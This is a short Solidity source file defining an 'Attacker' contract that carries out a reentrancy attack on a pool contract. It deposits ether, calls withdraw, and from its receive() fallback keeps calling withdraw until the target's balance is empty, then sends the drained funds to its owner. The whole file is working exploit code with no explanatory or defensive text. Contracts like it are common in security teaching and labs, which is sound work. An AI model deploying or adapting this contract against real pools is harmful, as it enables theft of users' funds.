// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

interface IPool {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IPool public immutable etherBank;
    address private owner;

    constructor(address etherBankAddress) {
        etherBank = IPool(etherBankAddress);
        owner = msg.sender;
    }

    function attack() external payable onlyOwner {
        etherBank.deposit{value: msg.value}();
        etherBank.withdraw();
    }

    receive() external payable {
        if (address(etherBank).balance > 0) {
            etherBank.withdraw();
        } else {
            payable(owner).transfer(address(this).balance);
        }
    }

    // check the total balance of the Attacker contract
    function getBalance() external view returns (uint) {
        return address(this).balance;
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "Only the owner can attack.");
        _;
    } 
}